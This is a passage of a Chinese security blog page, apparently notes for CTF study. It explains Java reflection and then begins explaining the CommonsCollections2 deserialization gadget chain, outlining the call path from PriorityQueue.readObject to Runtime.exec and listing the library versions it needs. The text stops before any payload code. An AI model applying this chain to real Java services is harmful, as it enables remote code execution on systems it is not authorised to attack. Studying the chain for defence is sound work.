@@ -1,0 +1,1555 @@
+<!DOCTYPE HTML>
+<html lang="zh_Cn">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="Java CommonsCollections2链学习, 123">
+    <meta name="description" content="Java CC2链学习">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>Java CommonsCollections2链学习 | kingkb</title>
+    <link rel="icon" type="image/png" href="/medias/logo1.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 6.0.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="kingkb" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo1.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">kingkb</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>Index</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>Tags</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>Categories</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>Archives</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>About</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>Contact</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>Friends</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo1.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">kingkb</div>
+        <div class="logo-desc">
+            
+            no game no life
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			Index
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			Tags
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			Categories
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			Archives
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			About
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			Contact
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			Friends
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://kingofkb.github.io/medias/cover/zshz5.jpeg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">Java CommonsCollections2链学习</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="container content">
+
+    
+    <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                                <span class="chip bg-color">java反序列化</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/ctf/" class="post-category">
+                                ctf
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
+                    2022-09-02
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
+                    2022-09-02
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
+                    3.5k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
+                    16 Min
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>Read Count:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="Java-CommonsCollections2链学习"><a href="#Java-CommonsCollections2链学习" class="headerlink" title="Java CommonsCollections2链学习"></a>Java CommonsCollections2链学习</h1><h2 id="Java反射机制"><a href="#Java反射机制" class="headerlink" title="Java反射机制"></a>Java反射机制</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44715943/article/details/120587716">Java反射</a></p>
+<h3 id="反射机制相关的重要的类"><a href="#反射机制相关的重要的类" class="headerlink" title="反射机制相关的重要的类"></a>反射机制相关的重要的类</h3><pre class=" language-1"><code class="language-1">java.lang.Class:代表整个字节码。代表一个类型，代表整个类。
+java.lang.reflect.Method:代表字节码中的方法字节码。代表类中的方法。
+java.lang.reflect.Constructor:代表字节码中的构造方法字节码。代表类中的构造方法。
+java.lang.reflect.Field:代表字节码中的属性字节码。代表类中的成员变量（静态变量+实例变量）。
+</code></pre>
+<p>注：必须先获得Class才能获取Method、Constructor、Field。</p>
+<h3 id="获取class的三种方式"><a href="#获取class的三种方式" class="headerlink" title="获取class的三种方式"></a>获取class的三种方式</h3><p>要操作一个类的字节码，需要首先获取到这个类的字节码，怎么获取java.lang.Class实例？<br>    class.forName()<br>    对象.class<br>    任何类型.class<br>注：以上三种方式返回值都是Class类型。</p>
+<h3 id="通过反射实例化对象"><a href="#通过反射实例化对象" class="headerlink" title="通过反射实例化对象"></a>通过反射实例化对象</h3><pre><code>对象.newInstance
+</code></pre>
+<p>注：newInstance()方法内部实际上调用了无参数构造方法，必须保证无参构造存在才可以。<br>否则会抛出java.lang.InstantiationException异常。</p>
+<h3 id="反射Filed【反射-反编译一个类的属性】"><a href="#反射Filed【反射-反编译一个类的属性】" class="headerlink" title="反射Filed【反射/反编译一个类的属性】"></a>反射Filed【反射/反编译一个类的属性】</h3><h4 id="Class类方法"><a href="#Class类方法" class="headerlink" title="Class类方法"></a>Class类方法</h4><pre class=" language-1"><code class="language-1">public T newInstance():创建对象
+public String getName():返回完整类名带包名
+public String getSimpleName():返回类名
+public Field[] getFields():返回类中public修饰的属性
+public Field[] getDeclaredFields():返回类中所有的属性
+public Field getDeclaredField(String name):根据属性名name获取指定的属性
+public native int getModifiers():获取属性的修饰符列表,返回的修饰符是一个数字，每个数字是修饰符的代号【一般配合Modifier类的toString(int x)方法使用】
+public Method[] getDeclaredMethods()    返回类中所有的实例方法
+public Method getDeclaredMethod(String name, Class<?>… parameterTypes):根据方法名name和方法形参获取指定方法
+public Constructor<?>[] getDeclaredConstructors():返回类中所有的构造方法
+public Constructor getDeclaredConstructor(Class<?>… parameterTypes):根据方法形参获取指定的构造方法
+----    ----
+public native Class<? super T> getSuperclass():返回调用类的父类
+public Class<?>[] getInterfaces():返回调用类实现的接口集合
+</code></pre>
+<h4 id="Field类方法"><a href="#Field类方法" class="headerlink" title="Field类方法"></a>Field类方法</h4><pre class=" language-1"><code class="language-1">public String getName():返回属性名
+public int getModifiers():获取属性的修饰符列表,返回的修饰符是一个数字，每个数字是修饰符的代号【一般配合Modifier类的toString(int x)方法使用】
+public Class<?> getType():以Class类型，返回属性类型【一般配合Class类的getSimpleName()方法使用】
+public void set(Object obj, Object value):设置属性值
+public Object get(Object obj):读取属性值
+</code></pre>
+<h4 id="反编译一个类的属性Field"><a href="#反编译一个类的属性Field" class="headerlink" title="反编译一个类的属性Field"></a>反编译一个类的属性Field</h4><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//通过反射机制，反编译一个类的属性Field（了解一下）</span>
+<span class="token keyword">class</span> <span class="token class-name">ReflectTest06</span><span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> ClassNotFoundException <span class="token punctuation">{</span>
+        StringBuilder s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        Class <span class="token class-name">studentClass</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"javase.reflectBean.Student"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        s<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>Modifier<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>studentClass<span class="token punctuation">.</span><span class="token function">getModifiers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" class "</span> <span class="token operator">+</span> studentClass<span class="token punctuation">.</span><span class="token function">getSimpleName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" {\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Class类的getName方法</span>
+        <span class="token comment" spellcheck="true">//获取所有的属性</span>
+        Field<span class="token punctuation">[</span><span class="token punctuation">]</span> fields <span class="token operator">=</span> studentClass<span class="token punctuation">.</span><span class="token function">getDeclaredFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span>Field f <span class="token operator">:</span> fields<span class="token punctuation">)</span><span class="token punctuation">{</span>
+            s<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"\t"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token comment" spellcheck="true">// 获取属性的修饰符列表,返回的修饰符是一个数字，每个数字是修饰符的代号</span>
+            <span class="token comment" spellcheck="true">// 用Modifier类的toString转换成字符串</span>
+            s<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>Modifier<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span><span class="token function">getModifiers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>f<span class="token punctuation">.</span><span class="token function">getModifiers</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> s<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            s<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSimpleName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 获取属性的类型</span>
+            s<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            s<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 获取属性的名字</span>
+            s<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">";\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        s<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<h4 id="通过反射机制访问一个java对象的属性"><a href="#通过反射机制访问一个java对象的属性" class="headerlink" title="通过反射机制访问一个java对象的属性"></a>通过反射机制访问一个java对象的属性</h4><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/*
+必须掌握：
+    怎么通过反射机制访问一个java对象的属性？
+        给属性赋值set
+        获取属性的值get
+ */</span>
+<span class="token keyword">class</span> <span class="token class-name">ReflectTest07</span><span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> ClassNotFoundException<span class="token punctuation">,</span> InstantiationException<span class="token punctuation">,</span> IllegalAccessException<span class="token punctuation">,</span> NoSuchFieldException <span class="token punctuation">{</span>
+        <span class="token comment" spellcheck="true">//不使用反射机制给属性赋值</span>
+        Student student <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">/**给属性赋值三要素：给s对象的no属性赋值1111
+         * 要素1：对象s
+         * 要素2：no属性
+         * 要素3：1111
+         */</span>
+        student<span class="token punctuation">.</span>no <span class="token operator">=</span> <span class="token number">1111</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">/**读属性值两个要素：获取s对象的no属性的值。
+         * 要素1：对象s
+         * 要素2：no属性
+         */</span>
+        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>student<span class="token punctuation">.</span>no<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment" spellcheck="true">//使用反射机制给属性赋值</span>
+        Class <span class="token class-name">studentClass</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"javase.reflectBean.Student"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Object obj <span class="token operator">=</span> studentClass<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// obj就是Student对象。（底层调用无参数构造方法）</span>
+
+        <span class="token comment" spellcheck="true">// 获取no属性（根据属性的名称来获取Field）</span>
+        Field noField <span class="token operator">=</span> studentClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">// 给obj对象(Student对象)的no属性赋值</span>
+        <span class="token comment" spellcheck="true">/*
+            虽然使用了反射机制，但是三要素还是缺一不可：
+                要素1：obj对象
+                要素2：no属性
+                要素3：22222值
+            注意：反射机制让代码复杂了，但是为了一个“灵活”，这也是值得的。
+         */</span>
+        noField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token number">22222</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment" spellcheck="true">// 读取属性的值</span>
+        <span class="token comment" spellcheck="true">// 两个要素：获取obj对象的no属性的值。</span>
+        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>noField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+</code></pre>
+<h4 id="set不可以访问私有属性"><a href="#set不可以访问私有属性" class="headerlink" title="set不可以访问私有属性"></a>set不可以访问私有属性</h4><p>需要打破封装<br>    public void setAccessible(boolean flag):默认false，设置为true为打破封装</p>
+<pre class=" language-java"><code class="language-java">        <span class="token comment" spellcheck="true">// 可以访问私有的属性吗？</span>
+        Field nameField <span class="token operator">=</span> studentClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">// 打破封装（反射机制的缺点：打破封装，可能会给不法分子留下机会！！！）</span>
+        <span class="token comment" spellcheck="true">// 这样设置完之后，在外部也是可以访问private的。</span>
+        nameField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">// 给name属性赋值</span>
+        nameField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"xiaowu"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">// 获取name属性的值</span>
+        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>nameField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><pre><code>获取类的方法： forName
+获取函数的方法： getMethod
+实例化类对象的方法： newInstance
+执行函数的方法： invoke
+</code></pre>
+<p>私有属性需要特殊的设置。</p>
+<h2 id="CommonsCollections2链"><a href="#CommonsCollections2链" class="headerlink" title="CommonsCollections2链"></a>CommonsCollections2链</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在JDK1.8 8u71版本以后，对<code>AnnotationInvocationHandler</code>的<code>readobject</code>进行了改写。导致高版本中利用链无法使用。<br>所以cc2版本就没用使用<code>AnnotationInvocationHandler</code>而时使用了<code>TemplatesImpI+PriorityQueue</code>来构造利用链的。<br><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>这个内置类, 这个类的骚操作就是,在调用他的<code>newTransformer</code>或者<code>getOutputProperties</code>(这个方法内部会调用<code>newTransformer</code>) 时,会动态从字节码中重建一个类。<br>这就使得如果我们能操作字节码, 就能在创建类时执任意 java 代码。</p>
+<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>jdk没有版本限制，commons.collections4。</p>
+<pre class=" language-java"><code class="language-java"><span class="token operator">&lt;</span>dependency<span class="token operator">></span>
+    <span class="token operator">&lt;</span>groupId<span class="token operator">></span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">></span>
+    <span class="token operator">&lt;</span>artifactId<span class="token operator">></span>commons<span class="token operator">-</span>collections4<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">></span>
+    <span class="token operator">&lt;</span>version<span class="token operator">></span><span class="token number">4.0</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">></span>
+</code></pre>
+<p>用于写字节码的javaassist。</p>
+<pre class=" language-java"><code class="language-java"><span class="token operator">&lt;</span>dependency<span class="token operator">></span>
+    <span class="token operator">&lt;</span>groupId<span class="token operator">></span>org<span class="token punctuation">.</span>javassist<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">></span>
+    <span class="token operator">&lt;</span>artifactId<span class="token operator">></span>javassist<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">></span>
+    <span class="token operator">&lt;</span>version<span class="token operator">></span><span class="token number">3.25</span><span class="token punctuation">.</span><span class="token number">0</span><span class="token operator">-</span>GA<span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">></span>
+</code></pre>
+<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>官方的调用链：</p>
+<pre class=" language-1"><code class="language-1">/*
+    Gadget chain:
+        ObjectInputStream.readObject()
+            PriorityQueue.readObject()
+                ...
+                    TransformingComparator.compare()
+                        InvokerTransformer.transform()
+                            Method.invoke()
+                                Runtime.exec()
+ */
+</code></pre>
+<p>ChainedTransformer之后就和commons collections1一样了。</p>
+<h3 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h3><p>PriorityQueue,它的出队顺序与元素的优先级有关，对PriorityQueue调用remove()或poll()方法，返回的总是优先级最高的元素。<br>要使用PriorityQueue，我们就必须给每个元素定义“优先级”。</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>PriorityQueue<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Queue<span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">cc2</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        Queue<span class="token operator">&lt;</span>String<span class="token operator">></span> queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        queue<span class="token punctuation">.</span><span class="token function">offer</span><span class="token punctuation">(</span><span class="token string">"banana"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        queue<span class="token punctuation">.</span><span class="token function">offer</span><span class="token punctuation">(</span><span class="token string">"pear"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        queue<span class="token punctuation">.</span><span class="token function">offer</span><span class="token punctuation">(</span><span class="token string">"apple"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>queue<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>queue<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>queue<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>queue<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
